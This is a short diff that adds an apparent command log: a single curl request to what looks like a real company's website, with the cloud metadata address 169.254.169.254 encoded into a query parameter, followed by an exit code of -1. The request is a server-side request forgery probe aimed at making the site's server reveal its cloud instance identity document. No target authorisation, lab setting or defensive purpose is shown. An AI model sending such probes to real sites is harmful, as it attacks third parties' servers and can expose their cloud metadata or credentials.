@@ -1,0 +1,4 @@
+# command: timeout 15 curl -s -m 13 -o - -w '\nHTTP_STATUS:%{http_code}' 'https://www.infinitycapital.bh/api/send?none=http%3A%2F%2F169.254.169.254%2Flatest%2Fdynamic%2Finstance-identity%2Fdocument'
+# exit_code: -1
+# ---
+
